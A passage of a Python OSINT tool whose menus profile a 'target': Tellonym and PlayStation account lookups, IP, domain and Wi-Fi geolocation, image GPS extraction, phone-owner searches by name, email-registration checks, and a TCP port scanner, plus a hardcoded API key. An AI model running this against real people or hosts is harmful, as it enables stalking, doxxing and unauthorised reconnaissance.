                    chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
                    return webdriver.Chrome(options=chrome_options)

                def get_info(self):
                    try:
                        self.driver.get(f"https://api.tellonym.me/profiles/name/{self.username}?previousRouteName=ScreenProfileSharing&isClickedInSearch=true&sourceElement=Search%20Result&adExpId=91&limit=16")
                        self.driver.implicitly_wait(5)
                        response = self.driver.find_element(By.TAG_NAME, "pre")

                        if "The entry you were looking for could not be found." in response.text:
                            input(f"{Red}Username not found!{White}")
                            exit()
                        elif "This account is banned." in response.text:
                            input(f"{Red}acc is banned!{White}")
                            exit()
                        else:
                            json_data = json.loads(response.text)
                            id = json_data.get("id", "Unknown")
                            username = json_data.get("username", "Unknown")
                            name = json_data.get("displayName", "Unknown")
                            bio = json_data.get("aboutMe", "Unknown")
                            avatar = f"https://userimg.tellonym.me/lg-v2/{json_data['avatarFileName']}"
                            countryCode = json_data.get("countryCode", "Unknown")
                            followers = json_data.get("followerCount", "Unknown")
                            anonymousFollowerCount = json_data.get("anonymousFollowerCount", "Unknown")
                            RealFollowers = followers - anonymousFollowerCount or "0"
                            following = json_data.get("followingCount", "Unknown")
                            tell = json_data.get("tellCount", "Unknown")
                            answer = json_data.get("answerCount", "Unknown")
                            likes = json_data.get("likesCount", "Unknown")
                            is_Verified = json_data.get("isVerified", "Unknown")
                            is_Able_to_comment = json_data.get("isAbleToComment", "Unknown")
                            is_Active = json_data.get("isActive", "Unknown")
                            
                            table = Table(title="\n")
                            table.add_column("Info", no_wrap=True)
                            table.add_column("Acc")
                            table.add_row("ID", str(id))
                            table.add_row("Username", str("@"+username))
                            table.add_row("Name", str(name))
                            table.add_row("Bio", str(bio))
                            table.add_row("Avatar", str(avatar))
                            table.add_row("Country", str(countryCode))
                            table.add_row("Followers", str(followers))
                            table.add_row("Real Followers", str(RealFollowers))
                            table.add_row("Anonymous Followers", str(anonymousFollowerCount))
                            table.add_row("Following", str(following))
                            table.add_row("Tells", str(tell))
                            table.add_row("Answers", str(answer))
                            table.add_row("Likes", str(likes))
                            table.add_row("is Verified acc?", "Yes" if is_Verified else "No")
                            table.add_row("is Able to comment?", "Yes" if is_Able_to_comment else "No")
                            table.add_row("is Active now?", "Yes" if is_Active else "No")
                            Console().print(table, justify="left")
                    except BaseException as mag: print(f"{Red}E : {mag}")

            username = input(f"{White}[{Blue}+{White}] - Enter username target : {Blue}@")
            print(f"{White}Getting info...")
            time.sleep(3)
            print(f"{White}[ Get info for {Blue}@{username} {Green}✓{White} ]\n")
            time.sleep(1)
            Tell(username)
        elif user_input == "7" or user_input == "07" or user_input == "Sony" or user_input == "SONY" or user_input == "sony":
            class PSN():
                def __init__(self):
                    self.key = input(f"{White}[{Blue}+{White}] Enter the npsso : {Blue}")
                    self.r = None
                    self.admin()

                def admin(self):
                    print(f"{White}Check npsso...\n")
                    time.sleep(1.5)

                    self.check_from_code()

                    if self.r:
                        submenu5()
                        user_input_submenu5 = input(f"Choose : {Blue}")
                        if user_input_submenu5 == "1" or user_input_submenu5 == "01" or user_input_submenu5 == "My acc info" or user_input_submenu5 == "MY ACC INFO" or user_input_submenu5 == "my acc info": self.my_acc_info()
                        elif user_input_submenu5 == "2" or user_input_submenu5 == "02" or user_input_submenu5 == "Osint for user by username" or user_input_submenu5 == "OSINT FOR USER BY USERNAME" or user_input_submenu5 == "osint for user by username": self.osint_username()
                        elif user_input_submenu5 == "3" or user_input_submenu5 == "03" or user_input_submenu5 == "Osint for user by userID" or user_input_submenu5 == "OSINT FOR USER BY USERID" or user_input_submenu5 == "osint for user by userid": self.osint_userid()
                        elif user_input_submenu5 == "99" or user_input_submenu5 == "Back" or user_input_submenu5 == "BACK" or user_input_submenu5 == "back": main_menu()
                        else: 
                            print(f"{Red}Please choose a correct option!")
                            submeun5()
                    else: print(f"{Red}Please enter a correct npsso!")

                def my_acc_info(self):
                    print(f"{White}Getting info...")
                    time.sleep(3)
                    print(f"{White}[ Get info for {Blue}{self.key} {Green}✓{White} ]")
                    time.sleep(1)

                    info = self.r.me()
                    table = Table(title="\n")
                    table.add_column("Info", no_wrap=True)
                    table.add_column("Acc")
                    table.add_row("UserID", info.account_id)
                    table.add_row("Username", f"@{info.online_id}")
                    info_profile = json.dumps(info.get_profile_legacy())
                    info_profile = json.loads(info_profile)
                    table.add_row("Nickname", f"{info_profile['profile']['personalDetail']['firstName']} {info_profile['profile']['personalDetail']['lastName']}")
                    device_info = json.dumps(info.get_account_devices())
                    device_info = json.loads(device_info)
                    table.add_row("Device", "PlayStation")
                    i = 0
                    while True:
                        try:
                            table.add_row("Device ID", device_info[i]['deviceId'])
                            table.add_row("Device Type", device_info[i]['deviceType'] if device_info[i]['deviceType'] else "Not Found")
                            table.add_row("Activation Date", device_info[i]['activationDate'])
                            i += 1
                        except: break
                    table.add_row("Avatar", info_profile['profile']['avatarUrls'][0]['avatarUrl'] if info_profile['profile']['avatarUrls'][0]['avatarUrl'] else "Not Found")
                    table.add_row("Have Plus?", str(info_profile['profile']['plus']))
                    table.add_row("Trophys", f"{info_profile['profile']['trophySummary']['earnedTrophies']['bronze']} Bronze | {info_profile['profile']['trophySummary']['earnedTrophies']['silver']} Silver | {info_profile['profile']['trophySummary']['earnedTrophies']['gold']} Gold | {info_profile['profile']['trophySummary']['earnedTrophies']['platinum']} Platinum")
                    Console().print(table, justify="left")
                    frinds_list = info.friends_list()
                    print("Friends List")
                    for accounts in frinds_list:
                        print(f"    User : @{accounts.online_id}")
                    info_b = info.blocked_list()
                    print("Blocked List")
                    for users in info_b:
                        print(f"    User : @{users.online_id}")

                def osint_username(self):
                    username = input(f"{White}[{Blue}+{White}] Enter username target : {Blue}@")

                    print(f"{White}Getting info...")
                    time.sleep(3)
                    print(f"{White}[ Get info for {Blue}{username} {Green}✓{White} ]")
                    time.sleep(1)

                    try:
                        info = self.r.user(online_id=username)
                        table = Table(title="\n")
                        table.add_column("Info", no_wrap=True)
                        table.add_column("Acc")
                        profile_info = info.profile()
                        table.add_row("UserID", info.account_id)
                        table.add_row("Username", f"@{profile_info['onlineId']}")
                        table.add_row("Nickname", f"{profile_info['personalDetail']['firstName']} {profile_info['personalDetail']['lastName']}")
                        table.add_row("Avatar", profile_info['personalDetail']['profilePictures'][0]['url'])
                        table.add_row("Bio", profile_info['personalDetail']['profilePictures'][0]['url'])
                        table.add_row("Have Plas?", str(profile_info['isPlus']))
                        Console().print(table, justify="left")
                    except BaseException as mag: print(f"{Red}E : {mag}")

                def osint_userid(self):
                    userid = input(f"{White}[{Blue}+{White}] Enter userid target : {Blue}")

                    print(f"{White}Getting info...")
                    time.sleep(3)
                    print(f"{White}[ Get info for {Blue}{userid} {Green}✓{White} ]")
                    time.sleep(1)

                    try:
                        info = self.r.user(account_id=userid)
                        table = Table(title="\n")
                        table.add_column("Info", no_wrap=True)
                        table.add_column("Acc")
                        profile_info = info.profile()
                        table.add_row("UserID", info.account_id)
                        table.add_row("Username", f"@{profile_info['onlineId']}")
                        table.add_row("Nickname", f"{profile_info['personalDetail']['firstName']} {profile_info['personalDetail']['lastName']}")
                        table.add_row("Avatar", profile_info['personalDetail']['profilePictures'][0]['url'])
                        table.add_row("Bio", profile_info['personalDetail']['profilePictures'][0]['url'])
                        table.add_row("Have Plas?", str(profile_info['isPlus']))
                        Console().print(table, justify="left")
                    except BaseException as mag: print(f"{Red}E : {mag}")

                def setup(self):
                    self.r = PSNAWP(self.key)

                def check_from_code(self):
                    try:
                        check = PSNAWP(self.key)
                        self.setup()
                    except: print(f"{Red}E : The npsso not working!")
            PSN()
        elif user_input == "99" or user_input == "Back" or user_input == "BACK": main_menu()
        else: print(f"{Red}Please choose a correct option!")
    elif selection == "4" or selection == "04" or selection == "Domains OSINT" or selection == "DOMAINS OSINT" or selection == "domains osint":
        domain = input(f"{White}[{Blue}+{White}] - Enter the domain or IP : {Blue}")
        
        print(f"{White}Getting info...")
        time.sleep(3)
        print(f"[ Get info for {Blue}{domain} {Green}✓{White} ]\n")
        time.sleep(1)

        def domain_info():
            url = f"https://demo.ip-api.com/json/{domain}?fields=66842623&lang=en"
            headers = { 'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'keep-alive',
                        'Host': 'demo.ip-api.com',
                        'Origin': 'https://ip-api.com',
                        'Referer': 'https://ip-api.com/',
                        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': "Windows",
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36' }
            req1 = requests.post(url, headers=headers)
            req2 = requests.get(f'https://ipapi.co/{domain}/json/')

            table = Table(title="")
            table.add_column("Info", no_wrap=True)
            table.add_column("Domain")
            try: 
                response = requests.get(f"https://{domain}/")
                table.add_row("URL", str(response.url))
            except requests.exceptions.SSLError: table.add_row("URL", str(socket.gethostbyaddr(domain)))
            try:
                ip = socket.gethostbyname(domain)
                table.add_row("IP", str(ip))
                hexhost = socket.inet_aton(domain)
                table.add_row("Binary Host", str(hexhost))
                table.add_row("Hex Host", str(hexlify(hexhost)))
            except OSError: 
                hexhost = socket.inet_aton(ip)
                table.add_row("Binary Host", str(hexhost))
                table.add_row("Hex Host", str(hexlify(hexhost)))
            try: table.add_row("Version", str(req2.json()['version']))
            except KeyError: None
            table.add_row("ISP", str(req1.json()['isp']))
            table.add_row("FQDN", str(socket.getfqdn(domain)))
            try: table.add_row("Asn", str(req2.json()['asn']))
            except KeyError: None
            table.add_row("Status", str(req1.json()['status']))
            table.add_row("Continent", str(req1.json()['continent']))
            table.add_row("ContinentCode", str(req1.json()['continentCode']))
            table.add_row("Country", str(req1.json()['country']))
            table.add_row("CountryCode", str(req1.json()['countryCode']))
            table.add_row("Region", str(req1.json()['region']))
            table.add_row("RegionName", str(req1.json()['regionName']))
            table.add_row("City", str(req1.json()['city']))
            table.add_row("District", str(req1.json()['district']))
            table.add_row("Zip", str(req1.json()['zip']))
            table.add_row("TimeZone", str(req1.json()['timezone']))
            table.add_row("Currency", str(req1.json()['currency']))
            table.add_row("Lat", str(req1.json()['lat']))
            table.add_row("Lon", str(req1.json()['lon']))
            table.add_row("Offset", str(req1.json()['offset']))
            table.add_row("Mobile", str("Yes" if req1.json()['mobile'] is True else "No"))
            table.add_row("Status", str("Yes" if req1.json()['proxy'] is True else "No"))
            table.add_row("Hosting", str("Yes" if req1.json()['hosting'] is True else "No"))
            Console().print(table, justify="left")
        domain_info()
    elif selection == "5" or selection == "05" or selection == "IP's OSINT" or selection == "IP'S OSINT" or selection == "ip's osint":
        ip_osint_selections = input(f"""{White}[{Blue}01{White}] - Target
[{Blue}02{White}] - Your device

[{Blue}99{White}] - Back
Choose : {Blue}""")
        if ip_osint_selections == "1" or ip_osint_selections == "01" or ip_osint_selections == "Target" or ip_osint_selections == "TARGET" or ip_osint_selections == "target":
            target_ip = input(f"{White}[{Blue}+{White}] - Enter Target IP : {Blue}")
            
            print(f"{White}Getting info...")
            time.sleep(3)
            print(f"[ Get info for {Blue}{target_ip} {Green}✓{White} ]\n") 
            time.sleep(1)

            try:
                response = requests.get(url=f'http://ip-api.com/json/{target_ip}').json()

                table = Table(title="")
                table.add_column("Info", no_wrap=True)
                table.add_column("IP")
                table.add_row("IP", str(response.get(search)))
                ip_version = ipaddress.ip_address(target_ip)
                table.add_row("Version", str("IPV4" if ip_version.version == 4 else "IPV6"))
                hexhost = socket.inet_aton(target_ip)
                table.add_row("Binary Host", str(hexhost))
                table.add_row("Hex Host", str(hexlify(hexhost)))
                ip_hostname = socket.gethostname()
                table.add_row("ISP", str(response.get('isp')))
                table.add_row("Country", str(response.get('country')))
                table.add_row("RegionName", str(response.get('regionName')))
                table.add_row("City", str(response.get('city')))
                table.add_row("Zip", str(response.get('zip')))
                table.add_row("Lat", str(response.get('lat')))
                table.add_row("Lon", str(response.get('lon')))
                Console().print(table, justify="left")
            except requests.exceptions.ConnectionError: print(f"{Red}Please check your connection!")
        elif ip_osint_selections == "2" or ip_osint_selections == "02" or ip_osint_selections == "Your device" or ip_osint_selections == "YOUR DEVICE" or ip_osint_selections == "your device":
            device_host_name = socket.gethostname()
            device_ip = socket.gethostbyname(device_host_name)
            ip_version = ipaddress.ip_address(device_ip)

            table = Table(title=f"{White}")
            table.add_column("Info", no_wrap=True)
            table.add_column("Yor device")
            table.add_row("OS", str(platform.system()))
            table.add_row("OS release", str(platform.version()))
            table.add_row("Architecture", str(platform.architecture()))
            table.add_row("Processor", str(platform.processor()))
            table.add_row("Total, Physical cores", str(f"{psutil.cpu_count(logical=True)}, {psutil.cpu_count(logical=False)}"))            
            cpufreq = psutil.cpu_freq()
            table.add_row("Max, Min, Current frequency", str(f"{cpufreq.max:.2f} MHz, {cpufreq.min:.2f} MHz, {cpufreq.current:.2f} MHz"))
            for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)): table.add_row(f"Core {i}", str(f"{percentage}%"))
            table.add_row(f"Total CPU Usage", str(f"{psutil.cpu_percent()}%"))
            total, used, free = shutil.disk_usage("/")
            table.add_row("Total, Used, Free storage space", str(f"{total//(2**30)}GB, {used//(2**30)}GB, {free//(2**30)}GB"))
            table.add_row("Hostname", str(device_host_name))
            table.add_row("IP", str(device_ip))
            table.add_row("Version", str("IPV4" if ip_version.version == 4 else "IPV6"))
            hexhost = socket.inet_aton(device_ip)
            table.add_row("Binary Host", str(hexhost))
            table.add_row("Hex Host", str(hexlify(hexhost)))
            try: ipv6_addr = str(socket.getaddrinfo(device_host_name, None, socket.AF_INET6)[0][4][0])
            except socket.gaierror: ipv6_addr = "Unavailable"
            table.add_row("IPV6", ipv6_addr)
            Console().print(table, justify="left")
        elif ip_osint_selections == "99" or ip_osint_selections == "Back" or ip_osint_selections == "BACK" or ip_osint_selections == "back": main_menu()
        else: print(f"{Red}Please choose a correct option!")
    elif selection == "6" or selection == "06" or selection == "Networks OSINT" or selection == "NETWORKS OSINT" or selection == "networks osint":
        submenu3()
        user_input = input(f"Choose : {Blue}")

        if user_input == "1" or user_input == "01" or user_input == "Networks OSINT" or user_input == "NETWORKS OSINT" or user_input == "networks osint":
            print(f"{White}Getting info...")
            time.sleep(3)
            print(f"[ Get info for {Blue}networks {Green}✓{White} ]")
            time.sleep(1)

            def check_os():
                os_name = platform.system()

                if os_name == "Windows":
                    print(f"{Blue}")
                    os.system("netsh wlan show interfaces & netsh wlan show networks & ipconfig")
                    print(f"{White}")
                elif os_name == "Linux":
                    def get_distro_name():
                        try:
                            output = subprocess.check_output("lsb_release -i", shell=True)
                            distro_name = output.decode().split(":")[1].strip().lower()
                        except BaseException as e: distro_name = None
                        return distro_name
                    distro_name = get_distro_name()
                    if "kali" in distro_name or "Mac OS" in os.environ: 
                        print(f"{Blue}")
                        os.system("ifconfig")
                        print(f"{White}")
                    elif "parrot" in distro_name:
                        print(f"{Blue}")
                        os.system("ip address")
                        print(f"{White}")
                    elif "arch" in distro_name or "backbox" in distro_name:
                        print(f"{Blue}")
                        os.system("ip")
                        print(f"{White}")
                elif os_name == "Darwin": 
                    if "iSH" in os.environ or "termux" in os.environ:
                        print(f"{Blue}")
                        os.system("ip a")
                        print(f"{White}")
                    else: pass
                else: print(f"{Red}OSINT cannot be done because your operating system is unknown!{White}")
            print(check_os())
        elif user_input == "2" or user_input == "02" or user_input == "Show network operations" or user_input == "SHOW NETWORK OPERATIONS" or user_input == "show network operations":
            print(f"{White}Extracting network operations...")
            time.sleep(3)
            print(f"\n[ Get {Blue}network operations {Green}✓{White} ]")
            time.sleep(1)

            print(f"{Blue}")
            os.system("netstat")
            print(f"{White}")
        elif user_input == "3" or user_input == "03" or user_input == "Extract The Location" or user_input == "EXTRACT THE LOCATION" or user_input == "extract The Location":     
            ___author___ = 'D4rkC00d3r'

            bssid = input(f"{White}[{Blue}+{White}] Enter the bssid target (ex: 00:0C:42:1F:65:E9) : {Blue}")

            api_uri = "https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid="
            map_url = "http://find-wifi.mylnikov.org/#"

            def show_map():
                while True:
                    show_map = input(f"Show the map? ({Blue}Y{White}/{Blue}N{White}) {Blue}")
                    if show_map == "Y" or show_map == "y" or show_map == "Yes" or show_map == "yes":
                        webbrowser.open(map_url+bssid)
                        return
                    else: break

            def results():
                if 'desc' in data: print(data['desc'])
                else:
                    table = Table(title="")
                    table.add_column("Info", no_wrap=True)
                    table.add_column("Network")
                    table.add_row("Lat", data['data']['lat'])
                    table.add_row("Lon", data['data']['lon'])
                    table.add_row("Meter accuracy",data['data']['range'] )
                    Console().print(table, justify="left")
                    show_map()
        elif user_input == "99" or user_input == "Back" or user_input == "BACK" or user_input == "back": main_menu()
        else: print(f"{Red}Please choose a correct option!")
    elif selection == "7" or selection == "07" or selection == "Images OSINT" or selection == "IMAGES OSINT" or selection == "images osint":
        class images:
            def __init__(self):
                try: 
                    self.img_name = str(input(f"{White}[{Blue}+{White}] Enter the img name or path : {Blue}")).replace(" ", "")
                    self.image = Image.open(self.img_name)
                    self.img_read = cv2.imread(self.img_name)
                except BaseException as msg: print(f"{Red}E: {msg}")

            def handle_exif_data(self):
                exif_data = self.image._getexif()
                if exif_data is not None:
                    for tag, value in exif_data.items():
                        tag_name = TAGS.get(tag, tag)
                        if tag_name == "DateTimeOriginal":
                            return value
                return None

            def DeviceInfo(self):
                try:  exif = self.image._getexif()
                except: exit()
                if self.image._getexif() is None: exit()
                else:
                    for k, v in self.image._getexif().items():
                        decoded = TAGS.get(k, k)
                        if decoded == "MakerNote": pass
                        elif decoded == "GPSInfo": self.GPSInfo = v

            def GetGeoposition(self):
                self.DeviceInfo()
                gp = self.GPSInfo
                if self.GPSInfo is None:
                    return None, None

                gpsinfo = {}
                for k in gp.keys():
                    decoded = GPSTAGS.get(k, k)
                    gpsinfo[decoded] = gp[k]
                lat = None
                lon = None
                gps_latitude = gpsinfo.get("GPSLatitude")
                gps_latitude_ref = gpsinfo.get("GPSLatitudeRef")
                gps_longitude = gpsinfo.get("GPSLongitude")
                gps_longitude_ref = gpsinfo.get("GPSLongitudeRef")
                if gps_latitude and gps_latitude_ref and gps_longitude and gps_longitude_ref:
                    lat = self._convert_to_degress(gps_latitude)
                    if gps_latitude_ref != 'N': lat = 0 - lat
                    lon = self._convert_to_degress(gps_longitude)
                    if gps_longitude_ref != 'E': lon = 0 - lon
                self.lat = lat
                self.lon = lon
                return True

            def LocationInfo(self):
                if not self.GetGeoposition(): pass
                else: 
                    headers = { 'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1' }
                    response = requests.get(f'https://api.opencagedata.com/geocode/v1/json?q={self.lat}+{self.lon}&key=03c48dae07364cabb7f121d8c1519492&no_annotations=1&language=en', headers=headers)
                    if "country" not in response.text: pass
                    try:
                        console = Console()
                        table = Table(title=f"{White}")
                        table.add_column("Pic", no_wrap=True)
                        table.add_column("Info")

                        for info in response.json()['results']:
                            date_taken = self.handle_exif_data()
                            if date_taken is not None: table.add_row("Imagine time", date_taken)
                            pixels = self.img_read.size
                            dim = self.img_read.shape
                            table.add_row("Pixels", str(pixels))
                            table.add_row("Dimensions", str(dim))
                            components = info['components']
                            for key, value in components.items():
                                if key not in ['ISO_3166-1_alpha-2', 'ISO_3166-1_alpha-3', 'ISO_3166-2']:
                                    table.add_row(key, str(value))
                        table.add_row("GoogleMap link", f"http://www.google.com/maps/place/{self.lat},{self.lon}")
                        console.print(table)
                    except: pass
        img = images()
        img.LocationInfo()
    elif selection == "8" or selection == "08" or selection == "PhoneNumbers OSINT" or selection == "PHONENUMBERS OSINT" or selection == "phonenumber osint":
        submenu2()
        user_input = input(f"Choose : {Blue}")

        if user_input == "1" or user_input == "01" or user_input == "PhoneNumber OSINT" or user_input == "PHONENUMBER OSINT" or user_input == "phonenumber osint":
            PhoneNumber = input(f"{White}[{Blue}+{White}] Enter the phonenumber (ex: +966500000000) : {Blue}")
            
            print(f"{White}Getting info...")
            time.sleep(3)
            print(f"{White}[ Get info for {Blue}{PhoneNumber} {Green}✓{White} ]\n") 
            time.sleep(1)

            try: parse = phonenumbers.parse(PhoneNumber)
            except: print(f"{Red}Please add countrycode!{White}")

            region = geocoder.description_for_number(parse, 'en')
            tiimezone = timezone.time_zones_for_number(parse)
            isp = carrier.name_for_number(parse, 'en')

            table = Table(title="")
            table.add_column("Info", no_wrap=True)
            table.add_column("PhoneNumber")
            table.add_row("Location", str(region))
            table.add_row("TimeZone", str(tiimezone))
            table.add_row("ISP", str(isp))
            Console().print(table, justify="left")
        elif user_input == "2" or user_input == "02" or user_input == "Search for the owner of the number by name" or user_input == "SEARCH FOR THE OWNER OF THE NUM BY NAME" or user_input == "search for the owner of the num by name":
            i = 1
            for country in pycountry.countries:
                print(f"{White}[{Blue}{str(i).zfill(3)}{White}] - {country.name} [{country.alpha_2}]")
                i += 1

            country = input(f"{White}[{Blue}+{White}] Enter the countrycode (ex: SA) : {Blue}")

            country_list = [
                "AF", "AX", "AL", "DZ", "AS", "AD", "AO", "AI", "AQ", "AG",
                "AR", "AM", "AW", "AU", "AT", "AZ", "BS", "BH", "BD", "BB",
                "BY", "BE", "BZ", "BJ", "BM", "BT", "BO", "BQ", "BA", "BW",
                "BV", "BR", "IO", "BN", "BG", "BF", "BI", "CV", "KH", "CM",
                "CA", "KY", "CF", "TD", "CL", "CN", "CX", "CC", "CO", "KM",
                "CD", "CG", "CK", "CR", "CI", "HR", "CU", "CW", "CY", "CZ",
                "DK", "DJ", "DM", "DO", "EC", "EG", "SV", "GQ", "ER", "EE",
                "SZ", "ET", "FK", "FO", "FJ", "FI", "FR", "GF", "PF", "TF", 
                "GA", "GM", "GE", "DE", "GH", "GI", "GR", "GL", "GD", "GP",
                "GU", "GT", "GG", "GN", "GW", "GY", "HT", "HM", "VA", "HN",
                "HK", "HU", "IS", "IN", "ID", "IR", "IQ", "IE", "IM", "IL", 
                "IT", "JM", "JP", "JE", "JO", "KZ", "KE", "KI", "KP", "KR",
                "KW", "KG", "LA", "LV", "LB", "LS", "LR", "LY", "LI", "LT",
                "LU", "MO", "MG", "MW", "MY", "MV", "ML", "MT", "MH", "MQ",
                "MR", "MU", "YT", "MX", "FM", "MD", "MC", "MN", "ME", "MS", 
                "MA", "MZ", "MM", "NA", "NR", "NP", "NL", "NC", "NZ", "NI", 
                "NE", "NG", "NU", "NF", "MK", "MP", "NO", "OM", "PK", "PW", 
                "PS", "PA", "PG", "PY", "PE", "PH", "PN", "PL", "PT", "PR",
                "QA", "RE", "RO", "RU", "RW", "BL", "SH", "KN", "LC", "MF",
                "PM", "VC", "WS", "SM", "ST", "SA", "SN", "RS", "SC", "SL", 
                "SG", "SK", "SX", "SI", "SB", "SO", "ZA", "GS", "SS", "ES",
                "LK", "SD", "SR", "SJ", "SE", "CH", "SY", "TW", "TJ", "TZ",
                "TH", "TL", "TG", "TK", "TO", "TT", "TN", "TR", "TM", "TC",
                "TV", "UG", "UA", "AE", "GB", "US", "UM", "UY", "UZ", "VU",
                "VE", "VN", "VG", "VI", "WF", "EH", "YE", "ZM", "ZW"]

            if country in country_list:
                name = input(f"{White}[{Blue}+{White}] Enter the target name : {Blue}")

                print(f"{White}Searching...")
                time.sleep(3)
                print(f"{White}[ Search for {Blue}{name} {Green}✓{White} ]\n") 
                time.sleep(1)

                url = f"https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code={country}&name={name}"
                r = requests.get(url, verify=False)
                data = r.json()

                if "result" in r.text:
                    if len(data['result']) > 0:
                        print(f"-"*40)
                        i = 1
                        for numbers in data['result']:
                            number = numbers['number']
                            name = numbers['name']
                            country_code = numbers['country_code']
                            address = numbers['address']

                            print(f"""{Blue}{i} {White}{{
    {White}[{Blue}-{White}] Name : {Blue}{name}
    {White}[{Blue}-{White}] Number : {Blue}{number}
    {White}[{Blue}-{White}] CountryCode : {Blue}{country_code}
    {White}[{Blue}-{White}] Address : {Blue}{address} {White} }}""")
                            i += 1
                elif "No recourd found" in r.text: print(f"{Red}nothing found for this name!")
            else: print(f"{Red}your country not in the list!")
        elif user_input == "99" or user_input == "Back" or user_input == "BACK" or user_input == "back": main_menu()
        else: print(f"{Red}Please choose a correct option!")
    elif selection == "9" or selection == "09" or selection == "Emails OSINT" or selection == "EMAILS OSINT" or selection == "emails osint":
        email = input(f"{White}[{Blue}+{White}] Enter the email target : {Blue}")

        print(f"{White}Checking...")
        time.sleep(3)
        print(f"{White}[ Check for {Blue}{email} {Green}✓{White} ]\n") 
        time.sleep(1)

        checker = Valid.Facebook(email)
        if checker == True: print(f"{White}[{Green}✓{White}] FaceBook Found")
        else: print(f"{White}[{Red}X{White}] FaceBook Not Found")
        time.sleep(0.5)
        url = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
        data = (f"email={email}&aid=1459&language=en&account_sdk_source=web&region=SA")
        header = {"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"}
        r = requests.post(url, headers=header, data=data)
        if '{"is_registered":1}' in r.text: print(f"{White}[{Green}✓{White}] TikTok Found")
        else: print(f"{White}[{Red}X{White}] TikTok Not Found")
        time.sleep(0.5)
        url = f"https://api.tellonym.me/accounts/check?email={email}&limit=13"
        headers = {"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"}
        r = requests.get(url, headers=headers)
        if '"EMAIL_ALREADY_IN_USE"' in r.text: print(f"{White}[{Green}✓{White}] Tellonym Found")
        else: print(f"{White}[{Red}X{White}] Tellonym Not Found")
    elif selection == "10" or selection == "Search Engine" or selection == "SEARCH ENGINE" or selection == "Search engine":
        searchh = input(f"{White}[{Blue}+{White}] Enter the thing to search for : {Blue}")
        result = input(f"{White}[{Blue}+{White}] Enter the num of results : {Blue}")

        print(f"{White}Searching...")
        time.sleep(3)
        print(f"{White}[ Search for {Blue}{searchh} {Green}✓{White} ]\n") 
        time.sleep(1)

        with open("ESR.txt", "at", encoding="utf-8") as f:
            for url in search(searchh, tld="co.in", num=int(result), stop=int(result)):
                page = requests.get(url)
                soup = BeautifulSoup(page.content, 'html.parser')

                title = soup.title.string if soup.title else 'No title'
                text = ' '.join(p.get_text() for p in soup.find_all('p'))

                f.write(f"""[-] Title : {title}
[-] URL : {url}
[-] Text : {text}\n\n""")

        print(f"{White}[{Green}✓{White}] The results has been saved in {Blue}{ os.getcwd()}\ESR.txt{White}")
    elif selection == "11" or selection == "Ports Scan" or selection == "PORTS SCAN" or selection == "ports scan":
        def check_port(ip_input, port):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                if s.connect_ex((ip_input, port)) == 0: return port

        def scan_ports(ip_input, num_ports):
            open_ports = []

            print(f"{White}Scanning...")

            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                future_to_port = {executor.submit(check_port, ip_input, port): port for port in range(1, num_ports+1)}
                for future in concurrent.futures.as_completed(future_to_port):
                    result = future.result()
                    if result is not None: open_ports.append(result)
            return sorted(open_ports)

        ip_input = input(f"{White}[{Blue}+{White}] Enter the target IP : {Blue}")
        num_ports = int(input(f"{White}[{Blue}+{White}] Entet the num of ports (1~65535) : {Blue}"))
        open_ports = scan_ports(ip_input, num_ports)

        if open_ports:
            print(f"{White}[ Scan for {Blue}{ip_input} {White}Ports {Green}✓{White} ]\n")
            time.sleep(1)

            for port in open_ports:
